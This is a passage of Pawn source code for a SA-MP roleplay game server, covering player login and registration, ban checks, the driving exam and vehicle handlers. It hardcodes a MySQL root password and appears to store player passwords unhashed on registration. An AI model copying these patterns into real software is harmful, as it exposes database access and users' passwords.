			ABroadCast(COLOR_ADMCHAT, 1, "{FFFFFF}({c40b0b}Admin Info{FFFFFF}) %s has been kicked for 2 failed logins.", GetName(playerid));
			return KickEx(playerid);
		}
		else
		{
			SCMF(playerid, COLOR_RED, "Incorrect password. You have %d remaining login attempts left.", 3 - GetPVarInt(playerid, "login_tries") - 1);
			Dialog_Show(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "SERVER: Login", "Welcome to the LocalHost RPG Server.\nPlease enter your password below!", "Login", "Cancel");
		}
	}
	else
	{
		cache_get_field_content(0, "Email", PlayerInfo[playerid][pEmail], SQL, 32);
        cache_get_field_content(0, "Crime1", PlayerInfo[playerid][pCrime1], SQL, 32);  
        cache_get_field_content(0, "Crime2", PlayerInfo[playerid][pCrime2], SQL, 32);  
        cache_get_field_content(0, "Crime3", PlayerInfo[playerid][pCrime3], SQL, 32);
        cache_get_field_content(0, "Victim", PlayerInfo[playerid][pVictim], SQL, 32);
		cache_get_field_content(0, "password", PlayerInfo[playerid][pKey], SQL, 32+1); 
        cache_get_field_content(0, "Accused", PlayerInfo[playerid][pAccused], SQL, 32);  
        cache_get_field_content(0, "PetName", PlayerInfo[playerid][pPetName], SQL, 32);
    	cache_get_field_content(0, "name", PlayerInfo[playerid][pNormalName], SQL, MAX_PLAYER_NAME);

    	PlayerInfo[playerid][pSQLID] 			     = 				cache_get_field_content_int(0, "id");
    	PlayerInfo[playerid][pAge] 				     = 				cache_get_field_content_int(0, "Age");
        PlayerInfo[playerid][pSex]                   =              cache_get_field_content_int(0, "Sex");
        PlayerInfo[playerid][pPet]                   =              cache_get_field_content_int(0, "Pet");
    	PlayerInfo[playerid][pRank] 			     = 				cache_get_field_content_int(0, "Rank");
        PlayerInfo[playerid][pAccount]               =              cache_get_field_content_int(0, "Bank");
        PlayerInfo[playerid][pCash]                  =              cache_get_field_content_int(0, "Money");
    	PlayerInfo[playerid][pModel]			     =				cache_get_field_content_int(0, "Model");
        PlayerInfo[playerid][pPremiumAccount]        =              cache_get_field_content_int(0, "Premium");
        PlayerInfo[playerid][pPremiumAccountDays]    =              cache_get_field_content_int(0, "PremiumDays");
        PlayerInfo[playerid][pVIPAccount]            =              cache_get_field_content_int(0, "VIP");
        PlayerInfo[playerid][pVIPAccountDays]        =              cache_get_field_content_int(0, "VIPDays");
    	PlayerInfo[playerid][pLevel] 			     = 				cache_get_field_content_int(0, "Level");
        PlayerInfo[playerid][pMuted]                 =              cache_get_field_content_int(0, "Muted");
        PlayerInfo[playerid][pColors]                =              cache_get_field_content_int(0, "Color");
    	PlayerInfo[playerid][pAdmin] 			     = 				cache_get_field_content_int(0, "Admin");
    	PlayerInfo[playerid][pHouse] 			     = 				cache_get_field_content_int(0, "House");
        PlayerInfo[playerid][pFACWarns]              =              cache_get_field_content_int(0, "FWarn");
    	PlayerInfo[playerid][pHelper] 			     = 				cache_get_field_content_int(0, "Helper");
    	PlayerInfo[playerid][pMember] 			     = 				cache_get_field_content_int(0, "Member");
    	PlayerInfo[playerid][pCarLic] 			     = 				cache_get_field_content_int(0, "CarLic");
    	PlayerInfo[playerid][pGunLic] 			     = 				cache_get_field_content_int(0, "GunLic");
    	PlayerInfo[playerid][pFlyLic] 			     = 				cache_get_field_content_int(0, "FlyLic");
        PlayerInfo[playerid][pAccountLY]             =              cache_get_field_content_int(0, "BankLY");
        PlayerInfo[playerid][pPetSkin]               =              cache_get_field_content_int(0, "PetSkin");
        PlayerInfo[playerid][pFpunish]               =              cache_get_field_content_int(0, "FPunish");
    	PlayerInfo[playerid][pBoatLic] 			     = 				cache_get_field_content_int(0, "BoatLic");
        PlayerInfo[playerid][pMuteTime]              =              cache_get_field_content_int(0, "MuteTime");
    	PlayerInfo[playerid][pBusiness]			     =				cache_get_field_content_int(0, "Business");
        PlayerInfo[playerid][pTut]                   =              cache_get_field_content_int(0, "Tutorial");
        PlayerInfo[playerid][pCarSlots]              =              cache_get_field_content_int(0, "CarSlots");
        PlayerInfo[playerid][pPetLevel]              =              cache_get_field_content_int(0, "PetLevel");
        PlayerInfo[playerid][pPetPoints]             =              cache_get_field_content_int(0, "PetPoints");
        PlayerInfo[playerid][pPetStatus]             =              cache_get_field_content_int(0, "PetStatus");
        PlayerInfo[playerid][pPaydayTime]            =              cache_get_field_content_int(0, "PaydayTime");
        PlayerInfo[playerid][pFactionJoin]           =              cache_get_field_content_int(0, "FactionJoin");
        PlayerInfo[playerid][pFactionTime]           =              cache_get_field_content_int(0, "FactionTime");
    	PlayerInfo[playerid][pSpawnChange]		     =				cache_get_field_content_int(0, "SpawnChange");
    	PlayerInfo[playerid][pWantedLevel]		     =				cache_get_field_content_int(0, "WantedLevel");
        PlayerInfo[playerid][pConnectTime]           =              cache_get_field_content_float(0, "ConnectTime");
        PlayerInfo[playerid][pClan]                  =              cache_get_field_content_int( 0, "Clan" );
        PlayerInfo[playerid][pClanRank]              =              cache_get_field_content_int( 0, "ClanRank" );
    	PlayerInfo[playerid][pCarLicSuspend] 	     = 				cache_get_field_content_int(0, "CarLicSuspend");
    	PlayerInfo[playerid][pGunLicSuspend] 	     = 				cache_get_field_content_int(0, "GunLicSuspend");
        PlayerInfo[playerid][pPremiumPoints]         =              cache_get_field_content_int(0, "PremiumPoints");

    	new
    		loadString[48];

        cache_get_field_content(0, "HUDOptions", loadString, SQL, sizeof loadString);
        sscanf(loadString, "a<i>[12]", PlayerInfo[playerid][pHUD]);

        cache_get_field_content(0, "Neons", loadString, SQL, sizeof loadString);
        sscanf(loadString, "a<i>[6]", PlayerInfo[playerid][pNeons]);

        cache_get_field_content(0, "Quest", loadString, SQL, sizeof loadString);
        sscanf(loadString, "a<i>[3]", PlayerInfo[playerid][pQuest]);

        cache_get_field_content(0, "QuestProgress", loadString, SQL, sizeof loadString);
        sscanf(loadString, "a<i>[3]", PlayerInfo[playerid][pQuestProgress]);

        cache_get_field_content(0, "QuestNeed", loadString, SQL, sizeof loadString);
        sscanf(loadString, "a<i>[3]", PlayerInfo[playerid][pQuestNeed]);

    	s_PlayerInfo[playerid][pSLoggedIn] = 1;

        if(Iter_Contains(playersInLogin, playerid)) Iter_Remove(playersInLogin, playerid);
        if(Iter_Contains(playersInQueue, playerid)) Iter_Remove(playersInQueue, playerid);

	    if(PlayerInfo[playerid][pTut] == 1)
			for(new i; i < 20; ++i) SCM(playerid, -1, "");
        if( PlayerInfo[ playerid ][ pClan ] )
        {
            AddTagToName( playerid );
        }
        if(PlayerInfo[playerid][pPremiumAccount] != 0)
            SCMF(playerid, -1, "You are a Premium Account User! %d days left.", PlayerInfo[playerid][pPremiumAccountDays]);
        else if(PlayerInfo[playerid][pVIPAccount] != 0)
            SCMF(playerid, -1, "You are a Vip Account User! %d days left.", PlayerInfo[playerid][pVIPAccountDays]);

	    if(PlayerInfo[playerid][pAdmin] > 0)
	    {
	        SCMF(playerid, -1, "You are a level %d admin. There are %d admins online (%d not afk).", PlayerInfo[playerid][pAdmin], Iter_Count(Admins), 0);

	        if(!Iter_Contains(Admins, playerid))
	        	Iter_Add(Admins, playerid);

	        sendStaffMessage(0xcc8e33FF, "HelloBot: %s has just logged in.", GetName(playerid));
	        SCMF(playerid, 0xcc8e33FF, "Admin MOTD: %s", SERVER_AMOTD);
	    }
        if(PlayerInfo[playerid][pPremiumAccount] != 0) Iter_Add(Premiums, playerid);
        if(PlayerInfo[playerid][pVIPAccount] != 0) Iter_Add(Vips, playerid), Iter_Add(Premiums, playerid);
	    if(PlayerInfo[playerid][pHelper] > 0)
	    {
	        SCMF(playerid, -1, "You are a level %d helper. There are %d helpers online (%d not afk).", PlayerInfo[playerid][pHelper], Iter_Count(Helpers), 0);

	        if(!Iter_Contains(Helpers, playerid))
	        	Iter_Add(Helpers, playerid);

	        sendStaffMessage(0xcc8e33FF, "HelloBot: %s has just logged in.", GetName(playerid));
	    }

	    if(!PlayerInfo[playerid][pQuest][0])
	        GivePlayerQuests(playerid);

	    showQuestProgress(playerid);

		if(PlayerInfo[playerid][pWantedLevel])
		{
			SCM(playerid, COLOR_RED2, "Esti inca urmarit de politie. Nivelul de wanted ti-a fost restaurat.");
			SetPlayerWanted(playerid);
		}
	    if(PlayerInfo[playerid][pMember])
	    {
	    	Iter_Add(FactionMembers<PlayerInfo[playerid][pMember]>, playerid);

            if(IsACop(playerid))
                Iter_Add(Cops, playerid);

	    	SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, 0, "(Group){FFFFFF} %s from your group has just logged in.", GetName(playerid));
	    	SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, 0, "(Group) MOTD:{ffffff} %s", DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);
	    }

        if(PlayerInfo[playerid][pHUD][5])
            updateLevelProgress(playerid);

        // UPDATE PD TIME
        PlayerInfo[playerid][pPaydayTime] = gettime() + PlayerInfo[playerid][pPaydayTime];

    	SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);

        SetLogInTDs(playerid);
        SetSpawnInfo(playerid, 0, 36, 1803.0000, -1868.0000, 13.5781, 1.0, -1, -1, -1, -1, -1, -1);
    	SpawnPlayer(playerid);
	}

	return 1;
}

function SetLogInTDs(playerid)
{
    format(gString, sizeof gString, "%s / RPG.LOCALHOST.RO", PlayerInfo[playerid][pNormalName]);
    PlayerTextDrawSetString(playerid, LogoPTD[playerid], gString);
    PlayerTextDrawShow(playerid, LogoPTD[playerid]);

    return 1;
}

function OnPlayerRegister(playerid, password[])
{
	new
		year, month, day, hour, minute, second;

	getdate(year, month, day), gettime(hour, minute, second);
	format(gString, sizeof gString, "%d-%02d-%02d %02d:%02d:%02d", year, month, day, hour, minute, second);

	mysql_format(SQL, gString, sizeof gString, "insert into `users` (`name`, `password`, `RegisterDate`) values ('%s', '%s', '%s')", GetName(playerid), password, gString);
	mysql_tquery(SQL, gString, "", "");

	return Dialog_Show(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "SERVER: Login", "Account registered!\nWelcome to the LocalHost RPG Server.\nPlease enter your password below!", "Login", "Cancel");
}

function SetPlayerHealthEx(playerid, Float: fHealth)
{
	SetPlayerHealth(playerid, fHealth);
	s_PlayerInfo[playerid][pSHealth] = fHealth;
	return 1;
}

function GetPlayerHealthEx(playerid, &Float: fHealth)
{
	fHealth = s_PlayerInfo[playerid][pSHealth];
	return 1;
}

function SetPlayerArmourEx(playerid, Float: fArmour)
{
	SetPlayerArmour(playerid, fArmour);
	s_PlayerInfo[playerid][pSArmour] = fArmour;
	return 1;
}

function GetPlayerArmourEx(playerid, &Float: fArmour)
{
	fArmour = s_PlayerInfo[playerid][pSArmour];
	return 1;
}

function PlayerLogin(playerid)
{
	s_PlayerInfo[playerid][pSAccountExist] = (cache_num_rows() ? (1) : (0));
    return LoginTransfer(playerid);
}

function database_connect()
{
	mysql_log(LOG_ERROR | LOG_WARNING, LOG_TYPE_HTML);

	if(SQL_CONNECTION_TYPE == 1)
		SQL = mysql_connect("localhost", "root", "t4pxences", "");
	
	else if(SQL_CONNECTION_TYPE == 2)
		SQL = mysql_connect("localhost", "root", "t4pxences", "");

	if(mysql_errno() && SQL_CONNECTION_TYPE == 1)
		SQL = mysql_connect("localhost", "root", "t4pxences", "");

	printf("connecting database to %s... status: %s", (SQL_CONNECTION_TYPE == 1 ? ("main server") : ("localhost server")), (mysql_errno() ? ("failed") : ("connected")));

	return 1;
}

function BanCheckStatus(playerid)
{
    if(!cache_num_rows())
    {
        return BanCheck(playerid, 0);
    }

    new
    	bannedPlayer[MAX_PLAYER_NAME], bannedBy[MAX_PLAYER_NAME], bannedReason[64], playerIP[16], bannedIP[16],
        bannedDays, iTimestamp, ipBanned, banActive = 0;

    for(new i; i < cache_num_rows(); i++)
    {
        bannedDays = cache_get_field_content_int(i, "bannedDays");
        iTimestamp = cache_get_field_content_int(i, "iTimestamp");
        ipBanned = cache_get_field_content_int(i, "ipBanned");
        banActive = cache_get_field_content_int(i, "banActive");

        cache_get_field_content(0, "bannedBy", bannedBy, SQL, MAX_PLAYER_NAME);
        cache_get_field_content(0, "playerName", bannedPlayer, SQL, MAX_PLAYER_NAME);
        cache_get_field_content(0, "bannedReason", bannedReason, SQL, 64);
        cache_get_field_content(0, "bannedIP", bannedIP, SQL, 16);

        if(!banActive)
            return BanCheck(playerid, 0);

        GetPlayerIp(playerid, playerIP, sizeof playerIP);

        if(iTimestamp + 300 > gettime() && !strmatch(bannedPlayer, GetName(playerid)))
        {
            //ABroadCast(1, COLOR_RED, "Warning: Adress %s owned by %s was temporary blocked. (recently banned account)", playerIP, GetName(playerid));
            SCM(playerid, COLOR_WARNING, "You can't login because you recently got banned. Try again later!");
            KickEx(playerid);
            break;
        }

        if(!strmatch(bannedPlayer, GetName(playerid)) && !ipBanned)
            return BanCheck(playerid, 0);

        if(iTimestamp + (bannedDays * 86400) < gettime())
        {
            if(bannedDays < 1 && bannedDays != -1 && ipBanned)
                goto next_step;

            else
            {
                //ABroadCast(1, COLOR_WARNING, "Account %s was unbanned (banId #%d).", bannedPlayer, cache_get_field_content_int(0, "ID"));

                mysql_format(SQL, gString, sizeof gString, "update `bans` set `banActive` = '0' where `ID` = '%d';", cache_get_field_content_int(0, "ID"));
                mysql_tquery(SQL, gString, "", "");

                BanCheck(playerid, false);
                break;
            }
        }
        else
        {
            next_step:

            // de facut mesaje
            KickEx(playerid);
            break;
        }
    }
    return 1;
}

// ======== PUBLICS ========
public OnQueryError( errorid, error[ ], callback[ ], query[ ], connectionHandle ) {
    print("-----------------------------------------------------------------------------------");
    print( "mysql query error detected..." );
    printf( ">> error %s [id: %d] | [callback: %s]", error, errorid, callback );
    printf( ">> query: %s", query );
    print("-----------------------------------------------------------------------------------");
    gString[0] = EOS; format(gString, sizeof gString, "mysql query error detected #%d (mysql error (#%s) / callback (%s))", errorid, error, callback);
    ABroadCast(COLOR_ERROR, 5, gString);
    sendStaffMessage(COLOR_WARNING, "[ERROR] Update request failed (OnQueryError, %d).", errorid);
    return 1; }

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ) {
    if(response) {
        SetPVarInt(playerid, "Edited", 1);
        ao[playerid][index][ao_x] = fOffsetX; ao[playerid][index][ao_y] = fOffsetY; ao[playerid][index][ao_z] = fOffsetZ; ao[playerid][index][ao_rx] = fRotX;
        ao[playerid][index][ao_ry] = fRotY; ao[playerid][index][ao_rz] = fRotZ; ao[playerid][index][ao_sx] = fScaleX; ao[playerid][index][ao_sy] = fScaleY; ao[playerid][index][ao_sz] = fScaleZ;   
    }
    else { new i = index; SetPlayerAttachedObjectEx(playerid, index, modelid, boneid, ao[playerid][i][ao_x], ao[playerid][i][ao_y], ao[playerid][i][ao_z], ao[playerid][i][ao_rx], ao[playerid][i][ao_ry], ao[playerid][i][ao_rz], ao[playerid][i][ao_sx], ao[playerid][i][ao_sy], ao[playerid][i][ao_sz]); }
    return 1; }

public OnPlayerText(playerid, text[])
{
    if(PlayerInfo[playerid][pMuted])
    {
        SCMF(playerid, -1, "You can not talk. You are muted for %s (%d seconds).", CalculeazaTimp2(PlayerInfo[playerid][pMuteTime]), PlayerInfo[playerid][pMuteTime]);
        return 0;
    }

    return 1;
}
public OnPlayerEnterRaceCheckpoint(playerid)
{
    if(s_PlayerInfo[playerid][pSCP] == 99)
    {
       DisablePlayerRaceCheckpoint(playerid);
       s_PlayerInfo[playerid][pSCP] = 0;
    }
    new string[2500];

    if(s_PlayerInfo[playerid][pSCP] == 100 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        DisablePlayerRaceCheckpoint(playerid);
        SetPlayerRaceCheckpoint(playerid, 0, 1135.4073,-1851.3762,13.1100,1072.1019,-1851.2997,13.1188, 4.0);
        s_PlayerInfo[playerid][pSCP] = 101;
        format(string, sizeof(string), "~w~CHECKPOINTS: ~r~1~w~/~r~10");
        PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
    }
    else if(s_PlayerInfo[playerid][pSCP] == 101 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        DisablePlayerRaceCheckpoint(playerid);
        SetPlayerRaceCheckpoint(playerid, 0, 1072.1019,-1851.2997,13.1188,1072.1019,-1851.2997,13.1188, 4.0);
        s_PlayerInfo[playerid][pSCP] = 102;
        format(string, sizeof(string), "~w~CHECKPOINTS: ~r~2~w~/~r~10");
        PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
    }
    else if(s_PlayerInfo[playerid][pSCP] == 102 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        DisablePlayerRaceCheckpoint(playerid);
        SetPlayerRaceCheckpoint(playerid,0, 1072.1019,-1851.2997,13.1188,1034.8300,-1798.7371,13.4173, 4.0);
        s_PlayerInfo[playerid][pSCP] = 103;
        format(string, sizeof(string), "~w~CHECKPOINTS: ~r~3~w~/~r~10");
        PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
    }
    else if(s_PlayerInfo[playerid][pSCP] == 103 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        DisablePlayerRaceCheckpoint(playerid);
        SetPlayerRaceCheckpoint(playerid,0, 1034.8300,-1798.7371,13.4173,1037.8590,-1718.6508,13.1135, 4.0);
        s_PlayerInfo[playerid][pSCP] = 104;
        format(string, sizeof(string), "~w~CHECKPOINTS: ~r~4~w~/~r~10");
        PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
    }
    else if(s_PlayerInfo[playerid][pSCP] == 104 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        DisablePlayerRaceCheckpoint(playerid);
        SetPlayerRaceCheckpoint(playerid,0, 1037.8590,-1718.6508,13.1135,1151.1692,-1712.1172,13.5083, 4.0);
        s_PlayerInfo[playerid][pSCP] = 105;
        format(string, sizeof(string), "~w~CHECKPOINTS: ~r~5~w~/~r~10");
        PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
    }
    else if(s_PlayerInfo[playerid][pSCP] == 105 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        DisablePlayerRaceCheckpoint(playerid);
        SetPlayerRaceCheckpoint(playerid,0, 1151.1692,-1712.1172,13.5083,1297.2880,-1712.2048,13.1099, 4.0);
        s_PlayerInfo[playerid][pSCP] = 106;
        format(string, sizeof(string), "~w~CHECKPOINTS: ~r~6~w~/~r~10");
        PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
    }
    else if(s_PlayerInfo[playerid][pSCP] == 106 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        DisablePlayerRaceCheckpoint(playerid);
        SetPlayerRaceCheckpoint(playerid,0, 1297.2880,-1712.2048,13.1099,1297.7179,-1795.6851,13.1099, 4.0);
        s_PlayerInfo[playerid][pSCP] = 107;
        format(string, sizeof(string), "~w~CHECKPOINTS: ~r~7~w~/~r~10");
        PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
    }
    else if(s_PlayerInfo[playerid][pSCP] == 107 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        DisablePlayerRaceCheckpoint(playerid);
        SetPlayerRaceCheckpoint(playerid, 0, 1297.7179,-1795.6851,13.1099, 1297.2825,-1840.4150,13.1099, 4.0);
        s_PlayerInfo[playerid][pSCP] = 108;
        format(string, sizeof(string), "~w~CHECKPOINTS: ~r~8~w~/~r~10");
        PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
    }
    else if(s_PlayerInfo[playerid][pSCP] == 108 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        DisablePlayerRaceCheckpoint(playerid);
        SetPlayerRaceCheckpoint(playerid, 0, 1297.2825,-1840.4150,13.1099, 1269.3766,-1818.6401,13.1113, 4.0);
        s_PlayerInfo[playerid][pSCP] = 109;
        format(string, sizeof(string), "~w~CHECKPOINTS: ~r~9~w~/~r~10");
        PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
    }
    else if(s_PlayerInfo[playerid][pSCP] == 109 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        DisablePlayerRaceCheckpoint(playerid);
        SetPlayerRaceCheckpoint(playerid, 1, 1269.3766,-1818.6401,13.1113, 0.0, 0.0, 0.0, 4.0);
        s_PlayerInfo[playerid][pSCP] = 110;
        format(string, sizeof(string), "~w~CHECKPOINTS: ~r~10~w~/~r~10");
        PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
    }
    else if(s_PlayerInfo[playerid][pSCP] == 110 && IsPlayerInVehicle(playerid, examcar[playerid]))
    {
        PlayerTextDrawHide(playerid, DMVexam[playerid]);
        PlayerTextDrawHide(playerid, DMVcheck[playerid]);
        DisablePlayerRaceCheckpoint(playerid);
        PlayerInfo[playerid][pCarLic] = 1;
        TakingLesson[playerid] = 0;
        DestroyVehicle(examcar[playerid]);
        DisableRemoteVehicleCollisions(playerid, 0);
        examcar[playerid] = -1;
        pUpdateInt(playerid, "CarLic", PlayerInfo[playerid][pCarLic]);
        SCM(playerid, COLOR_YELLOW, "Felicitari! Ai primit permisul de conducere, acum poti conduce orice masina!");
        s_PlayerInfo[playerid][pSCP] = 0;
        SpawnPlayer(playerid);
    }
    return 1;
}
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(Iter_Contains(VehicleType<VEH_TYPE_GROUP>, vehicleid))
	{
		new i = vehicleGroupId[vehicleid];
		
		if(f_VehicleInfo[i][vehGroup] && f_VehicleInfo[i][vehGroup] == PlayerInfo[playerid][pMember] && !s_PlayerInfo[playerid][pSOnDuty])
			SCM(playerid, COLOR_GREY, "Nu poti conduce acest vehicul deoarece nu esti la datorie.");

		else if(f_VehicleInfo[i][vehGroup] && f_VehicleInfo[i][vehGroup] == PlayerInfo[playerid][pMember] && PlayerInfo[playerid][pRank] < f_VehicleInfo[i][vehRank])
			va_SendClientMessage(playerid, COLOR_GREY, "Aceasta masina poate fi condusa doar de membrii cu rank %d+.", f_VehicleInfo[i][vehRank]);

		else if(f_VehicleInfo[i][vehGroup] != PlayerInfo[playerid][pMember])
			va_SendClientMessage(playerid, COLOR_GREY, "Aceasta masina poate fi condusa doar de membrii %s.", NumeFactiune(f_VehicleInfo[i][vehGroup]));

		/*else if(PlayerInfo[playerid][pMember] && f_VehicleInfo[i][vehGroup] == PlayerInfo[playerid][pMember] && DynamicFactions[PlayerInfo[playerid][pMember]][warActive] && GetVehicleModel(vehicleid) == 487)
			return SCM(playerid, -1, "Nu poti conduce acest vehicul in timpul war-ului.");
		*/

		else return 1;

		new
			Float:posX, Float:posY, Float:posZ;

		GetPlayerPos(playerid, posX, posY, posZ);
		SetPlayerPosEx(playerid, posX, posY, posZ + 1.5);
	}
	return 1;
}

public OnPlayerEnterDynamicArea(playerid, areaid)
{
	sendDebugMessage("[OnPlayerEnterDynamicArea] %s entered dynamic area. (%d: a:%d).", GetName(playerid), playerid, areaid);
	
	new
		factionId = Streamer_GetIntData(STREAMER_TYPE_AREA, areaid, E_STREAMER_EXTRA_ID) - STREAMER_BEGIN_FACTIONS;

	if(SERVER_FACTIONS < factionId)
		return 1;

	SetPVarInt(playerid, "streamer_faction_areaid", factionId);
	return 1;
}

public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	sendDebugMessage("[OnPlayerEnterDynamicArea] %s left dynamic area. (%d: a:%d).", GetName(playerid), playerid, areaid);
	SetPVarInt(playerid, "streamer_faction_areaid", 0);
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
	if(s_PlayerInfo[playerid][pSCP] == 1)
	{
        s_PlayerInfo[playerid][pSCP] = 0;
        DisablePlayerCheckpoint(playerid);
	}
	return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
    new
        wantedTarget=0;

	if(!Iter_Contains(streamedPlayers[forplayerid], playerid))
		Iter_Add(streamedPlayers[forplayerid], playerid);

    if(PlayerInfo[playerid][pWantedLevel] >= 1 && IsACop(forplayerid) && s_PlayerInfo[forplayerid][pSOnDuty] == 1)
        wantedTarget = 1;

    if(!wantedTarget)
    {
        SetPlayerMarkerForPlayer(playerid, forplayerid, (GetPlayerColor(forplayerid) & 0xFFFFFF00));
        SetPlayerMarkerForPlayer(forplayerid, playerid, (GetPlayerColor(playerid) & 0xFFFFFF00));
    }

	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	if(Iter_Contains(streamedPlayers[forplayerid], playerid))
		Iter_Remove(streamedPlayers[forplayerid], playerid);

    SetPlayerMarkerForPlayer(playerid, forplayerid, (GetPlayerColor(forplayerid) & 0xFFFFFF00));
    SetPlayerMarkerForPlayer(forplayerid, playerid, (GetPlayerColor(playerid) & 0xFFFFFF00));
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
    if(!Iter_Contains(streamedVehicles[forplayerid], vehicleid))
        Iter_Add(streamedVehicles[forplayerid], vehicleid);

    return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
    if(Iter_Contains(streamedVehicles[forplayerid], vehicleid))
        Iter_Remove(streamedVehicles[forplayerid], vehicleid);

    return 1;
}

public OnVehicleSpawn(vehicleid)
{
    if(Iter_Contains(VehicleType<VEH_TYPE_ADMIN>, vehicleid))
        DestroyVehicle(vehicleid);

    return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	switch(newstate)
	{
		case PLAYER_STATE_DRIVER:
		{
			new
				vehicleId = GetPlayerVehicleID(playerid);

            Iter_Add(PlayersInVehicle, playerid);
            SetPlayerArmedWeapon(playerid, 0);

            s_PlayerInfo[playerid][pSLastVehicle] = vehicleId;

            new
            	engine, lights, alarm, doors, bonnet, boot, objective;

			GetVehicleParamsEx(vehicleId, engine, lights, alarm, doors, bonnet, boot, objective);
		    SetVehicleParamsEx(vehicleId, (VehicleInfo[vehicleId][vehEngine] ? (1) : (0)), lights, alarm, doors, bonnet, boot, objective);
		
		    if(!VehicleInfo[vehicleId][vehFuel])
		    	TogglePlayerControllable(playerid, 0);

		    if(IsABoat(vehicleId) && !PlayerInfo[playerid][pBoatLic])
		    {
		    	SCM(playerid, COLOR_GREY, "You don't have a boat license.");
		    	SlapPlayer(playerid);
		    }
		    else if(IsAPlane(vehicleId) && !PlayerInfo[playerid][pFlyLic])
		    {
		    	SCM(playerid, COLOR_GREY, "You don't have a flying license.");
		    	SlapPlayer(playerid);
		    }
		    else if(!IsABike(vehicleId) && GetVehicleModel(vehicleId) != 462 && !PlayerInfo[playerid][pCarLic])
                if(TakingLesson[playerid] == 1) { }
                else 
                {
                    SCM(playerid,COLOR_GREY, "You don't have a driving license.");
                    SlapPlayer(playerid);
                }
		}
		case PLAYER_STATE_PASSENGER:
		{
			Iter_Add(PlayersInVehicle, playerid);
		}
		case PLAYER_STATE_ONFOOT:
		{
			if(Iter_Contains(PlayersInVehicle, playerid))
				Iter_Remove(PlayersInVehicle, playerid);

	        if(!PlayerInfo[playerid][pHUD][7])
	            PlayerTextDrawHide(playerid, veh_speedo[playerid]);
	        else
	            for(new i; i < 3; ++i) PlayerTextDrawHide(playerid, Speedo[playerid][i]);
		}
	}
}
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	switch(newkeys)
	{
		case KEY_SECONDARY_ATTACK:
		{
			if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
				return 1;

			if(IsPlayerInAnyDynamicArea(playerid) && GetPVarInt(playerid, "streamer_faction_areaid") > 0 && GetPVarInt(playerid, "streamer_faction_areaid") < SERVER_FACTIONS + 1)
			{
				if(GetPVarInt(playerid, "enter_building_deelay") > gettime())
					return va_SendClientMessage(playerid, COLOR_GREY, "[Anti-Abuz] Nu poti intra intr-o cladire timp de %d secunde.", GetPVarInt(playerid, "enter_building_deelay") - gettime());
				
				if(DynamicFactions[GetPVarInt(playerid, "streamer_faction_areaid")][fLocked] == 1 && PlayerInfo[playerid][pMember] != GetPVarInt(playerid, "streamer_faction_areaid"))
				{
					SCM(playerid, -1, "This HQ is locked.");

					if(IsACop(playerid) || PlayerInfo[playerid][pMember] == 11) // police & hitman check
					{
						format(gString, sizeof gString, "This Group HQ is locked.\nAs a %s, you can breach this door and enter. Would you like to do so?", (factionType[PlayerInfo[playerid][pMember]] == FACTION_TYPE_POLICE ? ("law enforcement officer") : ("hitman")));
						Dialog_Show(playerid, DIALOG_RAMHQ, DIALOG_STYLE_MSGBOX, "SERVER: Group HQ", gString, "Yes", "No");
					}
					return 1;
				}
				
				new
					factionId = GetPVarInt(playerid, "streamer_faction_areaid");

				SetPlayerPosEx(playerid, DynamicFactions[factionId][fcX], DynamicFactions[factionId][fcY], DynamicFactions[factionId][fcZ]);
				
				SetPlayerInterior(playerid, DynamicFactions[factionId][fInterior]);
				SetPlayerVirtualWorld(playerid, factionId);

				s_PlayerInfo[playerid][pSInHQ] = factionId;
				return 1;
			}

			if(GetPlayerVirtualWorld(playerid) != 0 && GetPlayerVirtualWorld(playerid) <= MAX_FACTIONS && IsPlayerInRangeOfPoint(playerid, 2, DynamicFactions[GetPlayerVirtualWorld(playerid)][fcX], DynamicFactions[GetPlayerVirtualWorld(playerid)][fcY], DynamicFactions[GetPlayerVirtualWorld(playerid)][fcZ]))
			{
				new
					factionId = GetPlayerVirtualWorld(playerid);

				SetPlayerPosEx(playerid, DynamicFactions[factionId][fceX], DynamicFactions[factionId][fceY], DynamicFactions[factionId][fceZ]);
				
				SetPlayerInterior(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);

				SetPVarInt(playerid, "streamer_faction_areaid", 0);
				SetPVarInt(playerid, "enter_building_deelay", gettime() + 5);
				
				s_PlayerInfo[playerid][pSInHQ] = 0;
				return 1;
			}

